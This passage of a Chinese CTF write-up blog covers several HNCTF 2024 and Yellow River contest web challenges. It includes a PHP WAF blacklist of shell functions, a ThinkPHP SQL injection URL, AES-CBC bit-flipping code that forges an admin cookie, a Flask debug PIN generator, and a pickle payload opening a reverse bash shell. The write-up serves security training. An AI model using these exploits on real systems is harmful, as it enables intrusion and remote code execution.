class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) == <span class="hljs-string">&#x27;HTTP_&#x27;</span>) <span class="hljs-variable">$headers</span>[<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-title function_ invoke__">ucwords</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">5</span>))))) ] = <span class="hljs-variable">$value</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>;<br>            <span class="hljs-variable">$post</span> = <span class="hljs-variable">$_POST</span>;<br>            <span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_COOKIE</span>;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-title function_ invoke__">getallheaders</span>();<br>            <span class="hljs-variable">$files</span> = <span class="hljs-variable">$_FILES</span>;<br>            <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];<br>            <span class="hljs-variable">$method</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>];<br>            <span class="hljs-variable">$filepath</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_NAME&quot;</span>];<br>            <span class="hljs-comment">//rewirte shell which uploaded by others, you can do more</span><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-variable">$files</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>                <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&quot;virink&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$header</span>[<span class="hljs-string">&#x27;Accept&#x27;</span>]); <span class="hljs-comment">//fix a bug</span><br>            <span class="hljs-variable">$input</span> = <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&quot;Get&quot;</span> =&gt; <span class="hljs-variable">$get</span>,<br>                <span class="hljs-string">&quot;Post&quot;</span> =&gt; <span class="hljs-variable">$post</span>,<br>                <span class="hljs-string">&quot;Cookie&quot;</span> =&gt; <span class="hljs-variable">$cookie</span>,<br>                <span class="hljs-string">&quot;File&quot;</span> =&gt; <span class="hljs-variable">$files</span>,<br>                <span class="hljs-string">&quot;Header&quot;</span> =&gt; <span class="hljs-variable">$header</span><br>            );<br>            <span class="hljs-comment">//deal with</span><br>            <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;insert|update|delete|and|or|\/\*|\*|\.\.\/|\.\/|into|load_file|outfile|dumpfile|sub|hex&quot;</span>;<br>            <span class="hljs-variable">$pattern</span>.= <span class="hljs-string">&quot;|file_put_contents|fwrite|curl|system|eval|assert&quot;</span>;<br>            <span class="hljs-variable">$pattern</span>.= <span class="hljs-string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;<br>            <span class="hljs-variable">$pattern</span>.= <span class="hljs-string">&quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec&quot;</span>;<br>            <span class="hljs-variable">$vpattern</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-variable">$pattern</span>);<br>            <span class="hljs-variable">$bool</span> = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$vpattern</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$v</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$kk</span> =&gt; <span class="hljs-variable">$vv</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$value</span>/i&quot;</span>, <span class="hljs-variable">$vv</span>)) &#123;<br>                            <span class="hljs-variable">$bool</span> = <span class="hljs-literal">true</span>;<br>                            <span class="hljs-keyword">break</span>;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$bool</span>) <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$bool</span>) <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$bool</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">I</span>(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br>        <span class="hljs-variable">$User</span> = <span class="hljs-title function_ invoke__">M</span>(<span class="hljs-string">&quot;user&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">waf</span>())&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">index</span>();<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$ret</span> = <span class="hljs-variable">$User</span>-&gt;<span class="hljs-title function_ invoke__">field</span>(<span class="hljs-string">&#x27;username,age&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$name</span>))-&gt;<span class="hljs-title function_ invoke__">select</span>();<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">var_export</span>(<span class="hljs-variable">$ret</span>, <span class="hljs-literal">true</span>);<br>        &#125;<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>参考<a href="https://blog.csdn.net/kuuhh/article/details/119323156">https://blog.csdn.net/kuuhh/article/details/119323156</a><br>这里是where数组+select()<br>方法是h_n<br>猜flag在flag表<br><code>/index.php/home/index/h_n?name[0]=exp&amp;name[1]==&#39;1&#39;union select database(),flag from flag</code><br><img src="/mdimg/HNCTF2024/1715671039892-d5e19ff6-5304-4a38-ba28-4ced8454d827.png"></p><h3 id="flipPin"><a href="#flipPin" class="headerlink" title="flipPin"></a>flipPin</h3><p>提示说debug没关，猜测flask算pin<br>拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, abort<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode, b64decode<br><br><span class="hljs-keyword">import</span> json<br><br>default_session = <span class="hljs-string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span><br>key = get_random_bytes(AES.block_size)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">session</span>):<br>    iv = get_random_bytes(AES.block_size)<br>    cipher = AES.new(key, AES.MODE_CBC, iv)<br>    <span class="hljs-keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), AES.block_size)))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">session</span>):<br>    raw = b64decode(session)<br>    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])<br>    <span class="hljs-keyword">try</span>:<br>        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br>app = Flask(__name__)<br><br>filename_blacklist = &#123;<br>    <span class="hljs-string">&#x27;self&#x27;</span>,<br>    <span class="hljs-string">&#x27;cgroup&#x27;</span>,<br>    <span class="hljs-string">&#x27;mountinfo&#x27;</span>,<br>    <span class="hljs-string">&#x27;env&#x27;</span>,<br>    <span class="hljs-string">&#x27;flag&#x27;</span><br>&#125;<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session = request.cookies.get(<span class="hljs-string">&#x27;session&#x27;</span>)<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        res = Response(<br>            <span class="hljs-string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)<br>        res.set_cookie(<span class="hljs-string">&#x27;session&#x27;</span>, encrypt(default_session).decode())<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;have a fun&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/hint&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hint</span>():<br>    res = Response(<span class="hljs-built_in">open</span>(__file__).read(), mimetype=<span class="hljs-string">&#x27;text/plain&#x27;</span>)<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/read&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">file</span>():<br><br>    session = request.cookies.get(<span class="hljs-string">&#x27;session&#x27;</span>)<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        res = Response(<span class="hljs-string">&quot;you are not logged in&quot;</span>)<br>        res.set_cookie(<span class="hljs-string">&#x27;session&#x27;</span>, encrypt(default_session))<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">else</span>:<br>        plain_session = decrypt(session)<br>        <span class="hljs-keyword">if</span> plain_session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;don\&#x27;t hack me&#x27;</span><br><br>        session_data = json.loads(plain_session)<br><br>        <span class="hljs-keyword">if</span> session_data[<span class="hljs-string">&#x27;admin&#x27;</span>] :<br>            filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>)<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(blacklist_str <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">for</span> blacklist_str <span class="hljs-keyword">in</span> filename_blacklist):<br>                abort(<span class="hljs-number">403</span>, description=<span class="hljs-string">&#x27;Access to this file is forbidden.&#x27;</span>)<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    <span class="hljs-keyword">return</span> f.read()<br>            <span class="hljs-keyword">except</span> FileNotFoundError:<br>                abort(<span class="hljs-number">404</span>, description=<span class="hljs-string">&#x27;File not found.&#x27;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                abort(<span class="hljs-number">500</span>, description=<span class="hljs-string">f&#x27;An error occurred: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are not an administrator&#x27;</span><br><br><br><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">9091</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>这里admin可以在/read路由读文件<br><code>cipher = AES.new(key, AES.MODE_CBC, iv)</code><br>AES-CBC字节反转攻击 获取session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode, b64encode<br><br>url = <span class="hljs-string">&quot;http://hnctf.imxbt.cn:42281/&quot;</span><br>default_session = <span class="hljs-string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span><br>res = requests.get(url)<br>c = <span class="hljs-built_in">bytearray</span>(b64decode(res.cookies[<span class="hljs-string">&quot;session&quot;</span>]))<br>c[default_session.index(<span class="hljs-string">&quot;0&quot;</span>)] ^= <span class="hljs-number">1</span><br>sess = b64encode(c).decode()<br><span class="hljs-built_in">print</span>(sess)<br></code></pre></td></tr></table></figure><p><img src="/mdimg/HNCTF2024/1715669080046-a8f06d63-d602-4a65-8ca4-0d150931b8f6.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">mac_to_decimal</span>(<span class="hljs-params">mac_address</span>):<br>    <span class="hljs-comment"># 将 MAC 地址分割成十六进制对</span><br>    hex_pairs = mac_address.split(<span class="hljs-string">&#x27;:&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 初始化十进制数值</span><br>    decimal_value = <span class="hljs-number">0</span><br>    <br>    <span class="hljs-comment"># 将每个十六进制对转换为十进制并累加</span><br>    <span class="hljs-keyword">for</span> hex_pair <span class="hljs-keyword">in</span> hex_pairs:<br>        decimal_value = (decimal_value &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-built_in">int</span>(hex_pair, <span class="hljs-number">16</span>)<br>    <br>    <span class="hljs-keyword">return</span> decimal_value<br><br><span class="hljs-comment"># 输入要转换的 MAC 地址</span><br>mac_address = <span class="hljs-string">&quot;16:39:1f:24:7a:d4&quot;</span><br><br><span class="hljs-comment"># 调用函数将 MAC 地址转换为十进制数值</span><br>decimal_value = mac_to_decimal(mac_address)<br><br><span class="hljs-comment"># 打印结果</span><br><span class="hljs-built_in">print</span>(decimal_value)<br><br></code></pre></td></tr></table></figure><p>有过滤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">filename_blacklist = &#123;<br>    <span class="hljs-string">&#x27;self&#x27;</span>,<br>    <span class="hljs-string">&#x27;cgroup&#x27;</span>,<br>    <span class="hljs-string">&#x27;mountinfo&#x27;</span>,<br>    <span class="hljs-string">&#x27;env&#x27;</span>,<br>    <span class="hljs-string">&#x27;flag&#x27;</span><br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br> <br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;ctfUser&#x27;</span>  <span class="hljs-comment"># username 可通过/etc/passwd获取</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,  <span class="hljs-comment"># modname默认值</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,  <span class="hljs-comment"># 默认值 getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/lib/python3.9/site-packages/flask/app.py&#x27;</span>  <span class="hljs-comment"># 路径 可报错得到  getattr(mod, &#x27;__file__&#x27;, None)</span><br>]<br> <br>private_bits = [<br>    <span class="hljs-string">&#x27;24434591431380&#x27;</span>,  <span class="hljs-comment"># /sys/class/net/eth0/address mac地址十进制</span><br>    <span class="hljs-string">&#x27;dd0fe358-1d2b-4bb4-90d1-5fee6bcf533f8eccacfd1923c5826caa5353084cf0087f7bc57a4bfeaf1db91f0eb3916d57af&#x27;</span><br> <br>    <span class="hljs-comment"># 字符串合并：首先读取文件内容 /etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id   /proc/self/cgroup</span><br>    <span class="hljs-comment">#self过滤用1 代替 cgroup过滤了可以考虑mountinfo或者cpuset</span><br>    <span class="hljs-comment"># 有machine-id 那就拼接machine-id + /proc/self/cgroup  否则 /proc/sys/kernel/random/boot_id + /proc/self/cgroup  (name=systemd:)</span><br>]<br> <br><span class="hljs-comment"># 下面为源码里面抄的，不需要修改</span><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br> <br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br> <br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br> <br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br> <br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure><p>/console进入debug<br><code>import os;os.environ</code><br><img src="/mdimg/HNCTF2024/1715670289791-e7e18515-762a-418a-952a-5cbf98ccc8a1.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第二届黄河流域网络安全技能挑战赛 -web</title>
    <link href="/2024/05/13/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%20-web/"/>
    <url>/2024/05/13/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%20-web/</url>
    
    <content type="html"><![CDATA[<h3 id="myfavorPython"><a href="#myfavorPython" class="headerlink" title="myfavorPython"></a>myfavorPython</h3><p>Pickle 反序列化<br>随便注册一个账号登进去<br>开了pickletools但没回显<br><img src="/mdimg/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/1715655004125-803d69c5-1260-44f6-8c9d-98651cd3721b.jpeg" alt="1715654998185.jpg"><br>反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">aaa</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span>(os.system,(<span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span>,))<br><br>a= aaa()<br><br>payload=pickle.dumps(a)<br><br>payload=base64.b64encode(payload)<br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure><p><img src="/mdimg/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/1715655034621-c6c11315-2e7a-4a22-a037-3a8f7528fd06.jpeg" alt="1715655031066.jpg"><br>读源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">from</span> flask <span 